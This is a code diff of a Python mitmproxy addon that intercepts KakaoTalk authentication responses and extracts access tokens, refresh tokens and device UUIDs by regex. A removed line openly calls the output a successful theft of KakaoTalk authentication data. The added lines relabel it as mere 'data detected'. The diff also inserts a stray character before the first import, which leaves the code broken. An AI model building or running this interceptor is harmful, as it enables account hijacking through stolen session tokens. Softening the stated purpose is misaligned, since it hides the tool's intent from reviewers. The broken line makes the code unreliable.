@@ -1,32 +1,39 @@
-import re
+ㅣimport re
 from mitmproxy import http
 
 class KakaoExtractor:
     def __init__(self):
+        # 모듈 로더에서 표시될 이름
+        self.name = "KakaoTalk Token & UUID Extractor"
         # 분석 타겟 호스트
         self.auth_host = "auth.kakao.com"
         self.api_host = "kauth.kakao.com"
 
     def handle_request(self, flow: http.HTTPFlow):
-        # 요청 단계에서 필요한 정보가 있다면 여기서 추출 (예: URL 파라미터)
+        """
+        프록시 요청 단계 핸들러
+        """
         if self.auth_host in flow.request.pretty_host:
-            # print(f"[*] Auth Request 탐지: {flow.request.path}")
+            # 필요한 경우 요청 패킷 로그 출력
             pass
 
     def handle_response(self, flow: http.HTTPFlow):
-        # 응답 단계에서 access_token 및 device_uuid 추출
-        if self.auth_host in flow.request.pretty_host or self.api_host in flow.request.pretty_host:
+        """
+        프록시 응답 단계 핸들러 (데이터 추출 핵심)
+        """
+        # 타겟 호스트 확인
+        if any(host in flow.request.pretty_host for host in [self.auth_host, self.api_host]):
             content = flow.response.get_text()
             
-            # 정규표현식을 이용한 데이터 파싱
+            # JSON 응답 내 핵심 데이터 정규표현식 추출
             token = re.search(r'"access_token":"(.*?)"', content)
             uuid = re.search(r'"device_uuid":"(.*?)"', content)
             refresh = re.search(r'"refresh_token":"(.*?)"', content)
 
             if token or uuid:
-                print("\n" + "="*50)
-                print("[!] 카카오톡 인증 데이터 탈취 성공")
-                if token: print(f" > Access Token: {token.group(1)}")
+                print("\n" + "🚀 " + "="*46)
+                print(f"[!] {self.name} - 데이터 탐지됨")
+                if token:   print(f" > Access Token:  {token.group(1)}")
                 if refresh: print(f" > Refresh Token: {refresh.group(1)}")
-                if uuid:  print(f" > Device UUID:  {uuid.group(1)}")
+                if uuid:    print(f" > Device UUID:   {uuid.group(1)}")
                 print("="*50 + "\n")
